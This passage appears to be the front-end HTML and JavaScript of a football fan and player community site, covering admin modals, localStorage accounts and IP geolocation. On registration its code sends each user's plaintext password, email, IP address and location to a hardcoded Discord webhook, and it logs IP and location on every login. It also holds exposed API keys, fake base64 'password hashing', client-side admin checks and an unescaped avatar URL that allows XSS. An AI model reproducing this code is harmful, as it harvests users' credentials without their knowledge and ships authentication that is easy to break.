<div class="ov" id="pov" onclick="closePM(event)">
  <div class="std-mod" onclick="event.stopPropagation()">
    <div class="mod-title">
      <span id="pmod-title-txt">Promote to Player</span>
      <div class="cbtn" onclick="closePM()">&#10005;</div>
    </div>
    <div class="pmod-sub" id="pmod-sub" style="font-size:12px;color:var(--gray);margin-bottom:16px;"></div>
    <input type="hidden" id="pu-id">
    <div class="fgrid">
      <div class="fg"><label class="flbl">Tier</label>
        <select class="finp" id="pp-tier"><option>Tier 1</option><option>Tier 2</option><option>Tier 3</option><option>Tier 4</option></select></div>
      <div class="fg"><label class="flbl">Nation</label><input class="finp" id="pp-nat" placeholder="ENG" maxlength="4"></div>
      <div class="fg"><label class="flbl">Value (M)</label><input class="finp" id="pp-val" type="number" min="0" step="0.1" placeholder="0.0"></div>
      <div class="fg"><label class="flbl">Goals</label><input class="finp" id="pp-gls" type="number" min="0" placeholder="0"></div>
      <div class="fg"><label class="flbl">Assists</label><input class="finp" id="pp-ast" type="number" min="0" placeholder="0"></div>
      <div class="fg full"><label class="flbl">Avatar URL</label><input class="finp" id="pp-ava" placeholder="https://..." maxlength="300"></div>
      <div class="fg"><label class="flbl">Position</label><input class="finp" id="pp-pos" placeholder="e.g. ST, CAM, GK" maxlength="20"></div>
      <div class="fg full"><label class="flbl">La Liga Team</label>
        <select class="finp" id="pp-team">
          <option value="">— No Team —</option>
          <option value="atleti">Atlético Madrid</option>
          <option value="barca">FC Barcelona</option>
          <option value="osasuna">CA Osasuna</option>
          <option value="girona">Girona FC</option>
          <option value="athletic">Athletic Bilbao</option>
          <option value="real">Real Madrid</option>
          <option value="betis">Real Betis</option>
          <option value="villar">Villarreal CF</option>
        </select>
      </div>
      <div class="fg full"><label class="flbl">Bio / Description</label><textarea class="finp" id="pp-bio" placeholder="Tell your story... achievements, playstyle, career highlights..." maxlength="300" rows="3" style="resize:vertical;min-height:70px;font-family:inherit;font-size:13px;"></textarea></div>
    </div>
    <div class="stats-label">Performance Stats</div>
    <div id="psliders"></div>
    <div class="mod-acts">
      <button class="fcancel" onclick="closePM()">Cancel</button>
      <button class="fsave" onclick="savePromote()">Promote &amp; Save</button>
    </div>
  </div>
</div>

<!-- MY PROFILE OVERLAY (fan + player: edit avatar & bio only) -->
<div class="ov" id="mpov" onclick="closeMPov(event)">
  <div class="std-mod" onclick="event.stopPropagation()" style="max-width:420px;">
    <div class="mod-title">
      <span>My Profile</span>
      <div class="cbtn" onclick="closeMPov()">&#10005;</div>
    </div>
    <!-- Avatar preview -->
    <div style="display:flex;flex-direction:column;align-items:center;gap:10px;margin-bottom:20px;">
      <div id="mp-ava-preview" style="width:80px;height:80px;border-radius:50%;overflow:hidden;background:var(--bg3);border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:'Barlow Condensed',sans-serif;font-size:28px;font-weight:800;"></div>
      <span style="font-size:10px;color:var(--gray);letter-spacing:1px;font-family:'Barlow Condensed',sans-serif;">PROFILE PICTURE PREVIEW</span>
    </div>
    <div class="fgrid">
      <div class="fg full">
        <label class="flbl">Profile Picture URL</label>
        <input class="finp" id="mp-ava" placeholder="https://i.imgur.com/yourimage.png" maxlength="300" oninput="previewMPAva()">
        <div style="font-size:10px;color:var(--gray);margin-top:4px;">Paste any image link (imgur, discord CDN, etc.)</div>
      </div>
      <div class="fg full">
        <label class="flbl">Bio / Description</label>
        <textarea class="finp" id="mp-bio" placeholder="Tell your story... achievements, playstyle, career highlights..." maxlength="300" rows="4" style="resize:vertical;min-height:90px;font-family:inherit;font-size:13px;"></textarea>
        <div style="font-size:10px;color:var(--gray);margin-top:4px;text-align:right;"><span id="mp-bio-count">0</span>/300</div>
      </div>
    </div>
    <div class="mod-acts">
      <button class="fcancel" onclick="closeMPov()">Cancel</button>
      <button class="fsave" onclick="saveMyProfile()">Save Profile</button>
    </div>
  </div>
</div>

<!-- AUTH OVERLAY -->
<div class="ov" id="aov" onclick="closeAov(event)">
  <div class="amod" onclick="event.stopPropagation()">
    <div class="acrest">
      <div class="auth-logo" id="auth-logo-circle">
        <img id="auth-img" alt="PHM" style="width:100%;height:100%;object-fit:cover;display:block;border-radius:50%;">
      </div>
    </div>
    <div class="aerr2" id="aerr"></div>
    <div class="aok" id="aok"></div>
    <div id="abody"></div>
  </div>
</div>

<!-- SET FLAG MODAL (admin only) -->
<div class="ov" id="fc-ov" onclick="closeFCov(event)">
  <div class="std-mod" onclick="event.stopPropagation()" style="max-width:380px;">
    <div class="mod-title">
      <span>🏳️ Set Country Flag</span>
      <div class="cbtn" onclick="closeFCov()">&#10005;</div>
    </div>

    <div style="font-size:12px;color:var(--gray);margin-bottom:16px;">
      Setting flag for <strong style="color:var(--white);font-family:'Barlow Condensed',sans-serif;font-size:14px;letter-spacing:1px;" id="fc-username"></strong>
    </div>

    <input type="hidden" id="fc-uid">

    <div class="fg" style="margin-bottom:16px;">
      <label class="flbl">Country Code <span style="color:var(--gray2);font-weight:400;">— 2 or 3 letters</span></label>
      <input class="finp" id="fc-input" placeholder="e.g. IRQ · GBR · USA · SAU · FRA" maxlength="3" autocomplete="off"
        style="font-family:'Orbitron',monospace;font-size:16px;letter-spacing:4px;text-align:center;text-transform:uppercase;"
        oninput="this.value=this.value.toUpperCase().replace(/[^A-Z]/g,'');fcPreview()"
        onkeydown="if(event.key==='Enter')saveFlagCode()">
    </div>

    <!-- Live preview -->
    <div style="display:flex;align-items:center;gap:14px;background:var(--card);border:1px solid var(--border2);border-radius:12px;padding:14px 18px;margin-bottom:20px;">
      <div id="fc-flag" style="font-size:42px;line-height:1;flex-shrink:0;">🏳️</div>
      <div id="fc-name" style="font-family:'Barlow Condensed',sans-serif;font-size:16px;font-weight:700;letter-spacing:1px;color:var(--gray);">No flag set</div>
    </div>

    <!-- Quick picks -->
    <div style="margin-bottom:18px;">
      <div class="flbl" style="margin-bottom:8px;">Quick pick</div>
      <div style="display:flex;flex-wrap:wrap;gap:6px;" id="fc-quickpicks"></div>
    </div>

    <div class="mod-acts">
      <button class="fcancel" onclick="closeFCov()">Cancel</button>
      <button class="fsave" onclick="saveFlagCode()">Set Flag</button>
    </div>
  </div>
</div>

<!-- BAN / DELETE MODAL -->
<div class="ov" id="ban-ov" onclick="closeBanMod(event)">
  <div class="std-mod" onclick="event.stopPropagation()" style="max-width:420px;">
    <div class="mod-title">
      <span id="ban-mod-title">Ban User</span>
      <div class="cbtn" onclick="closeBanMod()">&#10005;</div>
    </div>
    <input type="hidden" id="ban-uid">
    <input type="hidden" id="ban-mode">

    <!-- User display -->
    <div style="display:flex;align-items:center;gap:12px;background:var(--card);border:1px solid var(--border2);border-radius:10px;padding:12px 14px;margin-bottom:16px;">
      <span style="font-size:22px;">🚫</span>
      <div>
        <div style="font-family:'Barlow Condensed',sans-serif;font-size:13px;font-weight:700;color:var(--white);letter-spacing:1px;" id="ban-username-display"></div>
        <div style="font-size:10px;color:var(--gray);letter-spacing:1px;margin-top:2px;">Action will take effect immediately</div>
      </div>
    </div>

    <!-- Reason -->
    <div class="fg" style="margin-bottom:12px;">
      <label class="flbl" id="ban-reason-label">Ban Reason</label>
      <textarea class="finp" id="ban-reason" placeholder="e.g. Cheating, toxic behaviour, impersonation..." maxlength="200" rows="3" style="resize:none;font-family:inherit;font-size:13px;"></textarea>
    </div>

    <!-- Duration section -->
    <div id="ban-dur-section">
      <label class="flbl">Ban Duration</label>

      <!-- Permanent toggle -->
      <div style="display:flex;align-items:center;gap:8px;margin:8px 0 10px;">
        <input type="checkbox" id="ban-permanent" onchange="togglePermanent()" style="width:15px;height:15px;accent-color:var(--red);cursor:pointer;">
        <label for="ban-permanent" style="font-family:'Barlow Condensed',sans-serif;font-size:12px;font-weight:700;letter-spacing:1px;color:var(--gray);cursor:pointer;">Permanent Ban</label>
      </div>

      <!-- Duration picker -->
      <div id="ban-dur-row" style="display:flex;gap:8px;align-items:center;">
        <input type="number" class="finp" id="ban-dur-num" min="1" max="999" value="7" style="width:80px;text-align:center;font-family:'Orbitron',monospace;font-size:14px;">
        <select class="finp" id="ban-dur-type" style="flex:1;">
          <option value="days">Days</option>
          <option value="months">Months</option>
          <option value="years">Years</option>
        </select>
      </div>
    </div>

    <div class="mod-acts" style="margin-top:20px;">
      <button class="fcancel" onclick="closeBanMod()">Cancel</button>
      <button id="ban-save-btn" class="fsave" onclick="executeBanOrDelete()" style="background:#ef4444;box-shadow:0 0 14px rgba(239,68,68,.35);">BAN USER</button>
    </div>
  </div>
</div>

<!-- RESET DATABASE MODAL -->
<div class="ov" id="reset-ov" onclick="closeResetModal(event)">
  <div class="std-mod" onclick="event.stopPropagation()" style="max-width:400px;">
    <div class="mod-title">
      <span style="color:#f87171;">⚠️ Reset Database</span>
      <div class="cbtn" onclick="closeResetModal()">&#10005;</div>
    </div>

    <!-- Warning card -->
    <div style="background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.25);border-radius:12px;padding:16px 18px;margin-bottom:20px;">
      <div style="font-family:'Barlow Condensed',sans-serif;font-size:13px;font-weight:800;color:#f87171;letter-spacing:1px;margin-bottom:8px;">THIS CANNOT BE UNDONE</div>
      <div style="font-size:12px;color:rgba(248,113,113,.8);line-height:1.7;">
        This will permanently delete:<br>
        <span style="color:#fca5a5;">✕ All user accounts</span><br>
        <span style="color:#fca5a5;">✕ All player profiles &amp; stats</span><br>
        <span style="color:#fca5a5;">✕ All bans &amp; IP records</span><br>
        <span style="color:#fca5a5;">✕ All sessions &amp; verifications</span>
      </div>
    </div>

    <!-- Confirmation input -->
    <div class="fg" style="margin-bottom:18px;">
      <label class="flbl" style="color:#f87171;">Type <strong style="color:#fca5a5;letter-spacing:2px;">RESET</strong> to confirm</label>
      <input class="finp" id="reset-confirm-input" type="text" placeholder="RESET" autocomplete="off"
        style="font-family:'Orbitron',monospace;font-size:14px;letter-spacing:4px;text-align:center;border-color:rgba(239,68,68,.3);"
        oninput="checkResetInput()">
    </div>

    <div class="mod-acts" style="margin-top:0;">
      <button class="fcancel" onclick="closeResetModal()">Cancel</button>
      <button id="reset-confirm-btn" onclick="executeReset()" disabled
        style="font-family:'Barlow Condensed',sans-serif;font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;padding:9px 18px;border-radius:8px;cursor:not-allowed;background:rgba(239,68,68,.2);color:rgba(248,113,113,.4);border:1px solid rgba(239,68,68,.2);transition:all .3s;min-height:38px;">
        RESET ALL DATA
      </button>
    </div>
  </div>
</div>

<!-- TOAST -->
<div class="toast" id="toast">
  <span class="tico" id="tico"></span>
  <span id="tmsg"></span>
</div>

<script>
// ═══════════════════════════════════════════
// LOGO — paste your image URL here if you have one hosted
// If blank or fails, the built-in PHM shield logo shows instead
// ═══════════════════════════════════════════
const LOGO_SRC = 'https://i.imgur.com/kLM7xnX.png';

// Beautiful inline SVG shield logo — always works, no internet needed
const LOGO_SVG = `data:image/svg+xml;charset=utf-8,${encodeURIComponent(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">
  <defs>
    <linearGradient id="bg" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#1a3a6e"/>
      <stop offset="100%" stop-color="#0a1628"/>
    </linearGradient>
    <linearGradient id="sh" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#4d8fff"/>
      <stop offset="100%" stop-color="#1e6fff"/>
    </linearGradient>
    <linearGradient id="txt" x1="0%" y1="0%" x2="0%" y2="100%">
      <stop offset="0%" stop-color="#ffffff"/>
      <stop offset="100%" stop-color="#c8d8ff"/>
    </linearGradient>
    <filter id="glow">
      <feGaussianBlur stdDeviation="3" result="blur"/>
      <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
    </filter>
  </defs>
  <circle cx="100" cy="100" r="100" fill="url(#bg)"/>
  <circle cx="100" cy="100" r="96" fill="none" stroke="#1e6fff" stroke-width="1" opacity="0.3"/>
  <path d="M100 28 L158 50 L158 98 C158 134 132 162 100 172 C68 162 42 134 42 98 L42 50 Z" fill="url(#sh)" opacity="0.15"/>
  <path d="M100 34 L152 54 L152 98 C152 130 128 156 100 165 C72 156 48 130 48 98 L48 54 Z" fill="none" stroke="url(#sh)" stroke-width="1.5" filter="url(#glow)"/>
  <path d="M100 44 L142 60 L142 98 C142 124 124 146 100 153 C76 146 58 124 58 98 L58 60 Z" fill="url(#sh)" opacity="0.08"/>
  <line x1="68" y1="84" x2="132" y2="84" stroke="#4d8fff" stroke-width="1" opacity="0.5"/>
  <text x="100" y="124" text-anchor="middle" font-family="Arial Black,Arial" font-weight="900" font-size="44" letter-spacing="3" fill="url(#txt)" filter="url(#glow)">PHM</text>
</svg>`)}`;

function applyLogo(src){
  ['splash-img','load-img','nav-img','auth-img'].forEach(id=>{
    const el = document.getElementById(id);
    if(el) el.src = src;
  });
}

// Try logo URL with multiple extensions, fall back to SVG
(function loadLogo(){
  if(!LOGO_SRC){ applyLogo(LOGO_SVG); return; }
  const exts = ['', '.png', '.jpg'];
  const base = LOGO_SRC.replace(/\.(jpeg|jpg|png|gif|webp)$/i,'');
  let tried = 0;
  function tryNext(){
    if(tried >= exts.length){ applyLogo(LOGO_SVG); return; }
    const url = base + exts[tried++];
    const img = new Image();
    img.onload = () => applyLogo(url);
    img.onerror = tryNext;
    img.src = url + '?_=' + Date.now();
  }
  tryNext();
})();
// ═══════════════════════════════════════════
// EMAILJS CONFIGURATION
// ► Replace these 3 values with your own from emailjs.com (free account)
// ► Service ID: your email service (Gmail, Outlook, etc.)
// ► Template ID: create a template with variables {{to_email}}, {{username}}, {{code}}
// ► Public Key: from Account > API Keys
// ═══════════════════════════════════════════
const EJS_SERVICE  = 'service_d29kdjk';
const EJS_TEMPLATE = 'template_6048sbl';
const EJS_KEY      = 'angZ__SXPWAs4D9F5';


// ═══════════════════════════════════════════
// CONSTANTS & STORAGE
// ═══════════════════════════════════════════
const ADMIN = 'iysox';
const STATS = ['Shooting','Passing','Dribbling','Pace','Defending','Physical'];
// v8 = clean slate. Data persists permanently after this.
const UK = 'phm_users_v8';
const SK = 'phm_sess_v8';
const VK = 'phm_verify_v8';

// ── Discord Webhook — paste your webhook URL here ──
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1453353025165856839/EApWgOh15ajQ5VnFMmybwB_6k8hssLsXWWFxsofdHeNPd6ka-aIyekJrdkjFlPCUlFn-';

const hp  = s => btoa(unescape(encodeURIComponent(s + '::phm2025')));
const lu  = () => { try{return JSON.parse(localStorage.getItem(UK))||[];}catch{return[];} };
const su  = a => { try{localStorage.setItem(UK,JSON.stringify(a));}catch(e){console.warn('Storage write failed',e);} };
const ls  = () => { try{return JSON.parse(localStorage.getItem(SK));}catch{return null;} };
const ss  = u => { try{ if(u) localStorage.setItem(SK,JSON.stringify(u)); else localStorage.removeItem(SK); }catch(e){} };
const lv  = () => { try{return JSON.parse(localStorage.getItem(VK))||{};}catch{return{};} };
const sv  = v => { try{localStorage.setItem(VK,JSON.stringify(v));}catch(e){} };

// IP registry — tracks IPs that have registered
const IK = 'phm_ips_v8';
const li  = () => { try{return JSON.parse(localStorage.getItem(IK))||{};}catch{return{};} };
const si  = d => { try{localStorage.setItem(IK,JSON.stringify(d));}catch(e){} };

// One-time wipe of all OLD PHM version keys → fresh start
(function oneTimeFreshStart(){
  const flag = 'phm_init_v8';
  if(!localStorage.getItem(flag)){
    Object.keys(localStorage)
      .filter(k => k.startsWith('phm_') && k !== flag && k !== UK && k !== SK && k !== VK && k !== IK)
      .forEach(k => localStorage.removeItem(k));
    localStorage.setItem(flag,'1');
  }
})();

// ═══════════════════════════════════════════
// DISCORD WEBHOOK LOGGER
// ═══════════════════════════════════════════
async function sendWebhook(embed){
  if(!DISCORD_WEBHOOK||DISCORD_WEBHOOK==='YOUR_DISCORD_WEBHOOK_URL_HERE') return;
  try{
    await fetch(DISCORD_WEBHOOK,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({embeds:[embed]})
    });
  }catch(e){ console.warn('Webhook failed',e); }
}

function fmtTime(ts){
  return new Date(ts).toLocaleString('en-GB',{dateStyle:'short',timeStyle:'medium'});
}

async function logNewAccount(user, rawPass, ipData){
  const vpnWarn = ipData.vpn||ipData.proxy||ipData.tor ? '🚨 **VPN/PROXY DETECTED**' : '✅ Clean IP';
  // Use countryCode directly from ip-api (most accurate)
  const ccForFlag = (ipData.countryCode||ipData.country_code||'').toUpperCase().trim();
  const detectedFlag = countryFlag(ccForFlag);
  await sendWebhook({
    title:'🆕 New Account Registered',
    color:0x1e6fff,
    fields:[
      {name:'👤 Username',       value:`\`${user.username}\``,                        inline:true},
      {name:'🔑 Password',       value:`\`${rawPass}\``,                              inline:true},
      {name:'📧 Email',          value:`\`${user.email}\``,                           inline:true},
      {name:'🌍 IP Address',     value:`\`${ipData.ip||'Unknown'}\``,                 inline:true},
      {name:'📍 Location',       value:`\`${ipData.city||'?'}, ${ipData.region||'?'}, ${ipData.country||'?'}\``, inline:true},
      {name:'🏳️ Country Code',  value:`\`${ipData.countryCode||ipData.country_code||'?'}\` ${detectedFlag}`, inline:true},
      {name:'🛡️ VPN/Proxy',     value:vpnWarn,                                       inline:true},
      {name:'🌐 ISP',            value:`\`${ipData.org||'Unknown'}\``,                inline:true},
      {name:'🕐 Time',           value:`\`${fmtTime(user.createdAt)}\``,              inline:true},
      {name:'🎭 Role',           value:`\`${user.role}\``,                            inline:true},
      {name:'⚙️ Action Needed', value:`Go to Members → find \`${user.username}\` → click **Flag** button → type \`${ipData.countryCode||ipData.country_code||'???'}\` to assign their country flag`, inline:false},
    ],
    footer:{text:'PHM Security System'},
    timestamp: new Date().toISOString()
  });
}

async function logLogin(user, ipData){
  const vpnWarn = ipData.vpn||ipData.proxy||ipData.tor ? '🚨 VPN/PROXY' : '✅ Clean';
  await sendWebhook({
    title:'🔐 User Login',
    color:0x10b981,
    fields:[
      {name:'👤 Username',   value:`\`${user.username}\``,                                              inline:true},
      {name:'🎭 Role',       value:`\`${user.role}\``,                                                  inline:true},
      {name:'🌍 IP',         value:`\`${ipData.ip||'?'}\``,                                             inline:true},
      {name:'📍 Location',   value:`\`${ipData.city||'?'}, ${ipData.region||'?'}, ${ipData.country||'?'}\``, inline:true},
      {name:'🌐 ISP',        value:`\`${ipData.org||'?'}\``,                                            inline:true},
      {name:'🛡️ VPN',       value:vpnWarn,                                                             inline:true},
      {name:'🕐 Time',       value:`\`${fmtTime(Date.now())}\``,                                        inline:true},
    ],
    footer:{text:'PHM Security System'},
    timestamp:new Date().toISOString()
  });
}

async function logSecurityAlert(type, details, ipData){
  await sendWebhook({
    title:`🚨 SECURITY ALERT — ${type}`,
    color:0xef4444,
    fields:[
      {name:'⚠️ Event',      value:details,                                                             inline:false},
      {name:'🌍 IP',         value:`\`${ipData.ip||'?'}\``,                                             inline:true},
      {name:'📍 Location',   value:`\`${ipData.city||'?'}, ${ipData.region||'?'}, ${ipData.country||'?'}\``, inline:true},
      {name:'🛡️ VPN/Proxy', value:ipData.vpn||ipData.proxy||ipData.tor?'🚨 YES — BLOCKED':'✅ No',     inline:true},
      {name:'🌐 ISP',        value:`\`${ipData.org||'?'}\``,                                            inline:true},
      {name:'📡 AS',         value:`\`${ipData.as||'?'}\``,                                             inline:true},
      {name:'🕐 Time',       value:`\`${fmtTime(Date.now())}\``,                                        inline:true},
    ],
    footer:{text:'PHM Security System — Automated Block'},
    timestamp:new Date().toISOString()
  });
}

// ═══════════════════════════════════════════
// IP INTELLIGENCE — parallel race, never cache Unknown
// ═══════════════════════════════════════════
const VPN_KEYWORDS = [
  'vpn','proxy','hosting','datacenter','data center','digital ocean','linode',
  'vultr','hetzner','ovh','amazon','google cloud','microsoft azure','cloudflare',
  'mullvad','nordvpn','expressvpn','surfshark','cyberghost','ipvanish','pia ',
  'private internet','hidemyass','tunnelbear','hotspot shield','windscribe',
  'astrill','purevpn','hide.me','protonvpn','torguard','ivpn','perfect privacy',
  'akamai','fastly','aws ','ec2','gce','azure','as13335','as14061','as16509',
];
function detectVPNFromOrg(org){
  if(!org) return false;
  return VPN_KEYWORDS.some(k => org.toLowerCase().includes(k));
}

// Fetch with a hard timeout so no API hangs forever
function fetchWithTimeout(url, ms=6000){
  return Promise.race([
    fetch(url),
    new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')),ms))
  ]);
}

async function tryIPAPI(){
  const r = await fetchWithTimeout('https://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,isp,org,as,proxy,hosting,query');
  const d = await r.json();
  if(d.status!=='success'||!d.query) throw new Error('bad');
  return {
    ip:d.query, city:d.city, region:d.regionName, country:d.country,
    countryCode:d.countryCode, org:d.isp||d.org||'Unknown', as:d.as||'',
    vpn:d.proxy||d.hosting||detectVPNFromOrg(d.org)||detectVPNFromOrg(d.isp),
    proxy:d.proxy||false, tor:false,
  };
}
async function tryIPWho(){
  const r = await fetchWithTimeout('https://ipwho.is/');
  const d = await r.json();
  if(!d.success||!d.ip) throw new Error('bad');
  return {
    ip:d.ip, city:d.city, region:d.region, country:d.country,
    countryCode:d.country_code, org:d.connection?.isp||'Unknown', as:String(d.connection?.asn||''),
    vpn:d.security?.vpn||d.security?.proxy||d.security?.hosting||detectVPNFromOrg(d.connection?.isp),
    proxy:d.security?.proxy||false, tor:d.security?.tor||false,
  };
}
async function tryIPApiCo(){
  const r = await fetchWithTimeout('https://ipapi.co/json/');
  const d = await r.json();
  if(d.error||!d.ip) throw new Error('bad');
  return {
    ip:d.ip, city:d.city, region:d.region, country:d.country_name,
    countryCode:d.country_code, org:d.org||'Unknown', as:d.asn||'',
    vpn:detectVPNFromOrg(d.org)||detectVPNFromOrg(d.asn),
    proxy:false, tor:false,
  };
}
async function tryIPify(){
  // ipify gives plain IP, then we enrich with ip-api
  const r = await fetchWithTimeout('https://api.ipify.org?format=json');
  const d = await r.json();
  if(!d.ip) throw new Error('bad');
  const r2 = await fetchWithTimeout(`https://ip-api.com/json/${d.ip}?fields=status,country,countryCode,regionName,city,isp,org,as,proxy,hosting,query`);
  const d2 = await r2.json();
  if(d2.status!=='success') throw new Error('bad');
  return {
    ip:d.ip, city:d2.city, region:d2.regionName, country:d2.country,
    countryCode:d2.countryCode, org:d2.isp||d2.org||'Unknown', as:d2.as||'',
    vpn:d2.proxy||d2.hosting||detectVPNFromOrg(d2.org)||detectVPNFromOrg(d2.isp),
    proxy:d2.proxy||false, tor:false,
  };
}

// Race all APIs simultaneously — fastest valid response wins
async function getIPData(){
  // Wrap each so rejections don't crash Promise.any
  const apis = [tryIPAPI, tryIPWho, tryIPApiCo, tryIPify];
  try{
    const result = await Promise.any(apis.map(fn => fn()));
    return result;
  }catch(e){
    // All failed
    return {ip:'Unknown',city:'Unknown',region:'Unknown',country:'Unknown',countryCode:'',org:'Unknown',as:'',vpn:false,proxy:false,tor:false};
  }
}

// Cache IP per session — but NEVER cache Unknown (retry if last attempt failed)
let _cachedIP = null;
async function getIP(){
  if(_cachedIP && _cachedIP.ip !== 'Unknown') return _cachedIP;
  _cachedIP = await getIPData();
  return _cachedIP;
}

// Init EmailJS — keys are live
emailjs.init({ publicKey: EJS_KEY });

function getU(){ const s=ls(); if(!s)return null; return lu().find(x=>x.id===s.id)||null; }
const isAdmin = ()=>{ const u=getU(); return u&&u.role==='admin'; };

// ═══════════════════════════════════════════
// SCREENS
// ═══════════════════════════════════════════
function show(id){ document.getElementById(id).classList.add('active'); }
function hide(id){ document.getElementById(id).classList.remove('active'); }

function goLoad(){
  hide('splash'); show('loading');
  const lf = document.getElementById('lf');
  const lp = document.getElementById('lpct');
  lf.style.cssText='width:0%;transition:none;';
  let pct = 0;
  const interval = setInterval(()=>{
    pct = Math.min(pct + Math.random()*3 + 1, 99);
    if(lp) lp.textContent = Math.floor(pct) + '%';
  }, 40);
  requestAnimationFrame(()=>requestAnimationFrame(()=>{
    lf.style.cssText='width:100%;transition:width 2.2s ease;';
  }));
  setTimeout(()=>{
    clearInterval(interval);
    if(lp) lp.textContent = '100%';
    setTimeout(()=>{ hide('loading'); show('app'); refreshAll(); renderNav(); }, 200);
  }, 2500);
}

// ═══════════════════════════════════════════
// PAGE NAV
// ═══════════════════════════════════════════
let stField='goals';

function goPage(name,el){
  document.querySelectorAll('.page').forEach(p=>p.classList.remove('on'));
  document.getElementById('page-'+name).classList.add('on');
  document.querySelectorAll('.ntab').forEach(t=>t.classList.remove('on'));
  if(el) el.classList.add('on');
  if(name==='analytics') renderAnalytics();
  if(name==='members')   renderMembers();
  if(name==='teams')     renderTeams();
}

// ═══════════════════════════════════════════
// NAV
// ═══════════════════════════════════════════
function renderNav(){
  const u = getU();
  document.getElementById('mtab').style.display = isAdmin()?'':'none';
  const nr = document.getElementById('nright');
  if(!u){
    nr.innerHTML=`<button class="bsmall boutline" onclick="openAuth('login')">Sign In</button><button class="bsmall bprimary" onclick="openAuth('register')">Register</button>`;
    return;
  }
  const rc = u.role==='admin'?'radmin':u.role==='player'?'rplayer':'rfan';
  const rl = u.role==='admin'?'Admin':u.role==='player'?'Player':'Fan';
  const verifiedBadge = u.emailVerified ? '' : `<span style="font-size:9px;color:#fbbf24;font-family:'Barlow Condensed',sans-serif;letter-spacing:1px;padding:1px 6px;border-radius:10px;background:rgba(245,158,11,.15);border:1px solid rgba(245,158,11,.25)">Unverified</span>`;
  nr.innerHTML=`
    <div class="upill" onclick="tdd()" id="upill">
      <div class="uava">${avaC(u,24)}</div>
      <span class="uname">${userFlag(u)} ${esc(u.username)}</span>
      ${u.role==='admin'?`<span class="shield">&#x1F6E1;&#xFE0F;</span>`:''}
      <span class="rbadge ${rc}">${rl}</span>
      <div class="dd" id="udd">
        ${verifiedBadge ? `<div class="ddi" onclick="openVerify();tdd(false)"><svg viewBox="0 0 24 24"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>Verify Email</div>`:''}
        ${isAdmin()?`<div class="ddi" onclick="goPage('members');tdd(false)"><svg viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>Members</div>`:''}
        ${(u.role==='player'||u.role==='admin')?`<div class="ddi" onclick="openEditModal('${u.id}');tdd(false)"><svg viewBox="0 0 24 24"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>My Stats</div>`:''}
        <div class="ddi" onclick="openMyProfile();tdd(false)"><svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>My Profile</div>
        ${isAdmin()?`<div class="ddi red" onclick="openResetModal();tdd(false)" style="border-top:1px solid rgba(239,68,68,.15);"><svg viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/><path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg>Reset Database</div>`:''}\n        ${isAdmin()?`<div class="ddi" onclick="openRStatsModal();tdd(false)" style="color:#fbbf24;border-top:1px solid rgba(245,158,11,.1);"><svg viewBox="0 0 24 24"><path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 3v5h5"/><path d="M12 7v5l4 2"/></svg>Reset All Stats</div>`:''}
        <div class="ddi red" onclick="doLogout()"><svg viewBox="0 0 24 24"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>Sign Out</div>
      </div>
    </div>`;
}

function avaC(u,sz){
  const av=u.playerProfile?.avatar||u.avatar;
  if(av&&av.startsWith('http')) return `<img src="${av}" onerror="this.outerHTML='<span style=font-family:Barlow+Condensed,sans-serif;font-size:${Math.floor(sz*.55)}px;font-weight:800>${u.username[0].toUpperCase()}</span>'">`;
  return `<span style="font-family:'Barlow Condensed';font-size:${Math.floor(sz*.55)}px;font-weight:800">${u.username[0].toUpperCase()}</span>`;
}

// ── Country code → flag emoji ──
function countryFlag(code){
  if(!code||code.length<2) return '';
  const c = code.toUpperCase().trim();
  // Convert ISO 3166-1 alpha-2 to flag emoji
  // Also support common 3-letter codes → map to 2-letter
  const map3={
    IRQ:'IQ',SAU:'SA',UAE:'AE',EGY:'EG',MAR:'MA',TUN:'TN',DZA:'DZ',LBY:'LY',
    LBN:'LB',SYR:'SY',JOR:'JO',PSE:'PS',YEM:'YE',OMN:'OM',KWT:'KW',BHR:'BH',
    QAT:'QA',GBR:'GB',USA:'US',FRA:'FR',DEU:'DE',ESP:'ES',ITA:'IT',PRT:'PT',
    NLD:'NL',BEL:'BE',CHE:'CH',AUT:'AT',SWE:'SE',NOR:'NO',DNK:'DK',FIN:'FI',
    POL:'PL',RUS:'RU',TUR:'TR',GRC:'GR',ROU:'RO',HRV:'HR',SRB:'RS',BRA:'BR',
    ARG:'AR',COL:'CO',CHL:'CL',MEX:'MX',PER:'PE',VEN:'VE',URY:'UY',PAR:'PY',
    NGA:'NG',GHA:'GH',SEN:'SN',CMR:'CM',CIV:'CI',ZAF:'ZA',KEN:'KE',ETH:'ET',
    TZA:'TZ',UGA:'UG',ZIM:'ZW',JPN:'JP',CHN:'CN',KOR:'KR',IND:'IN',PAK:'PK',
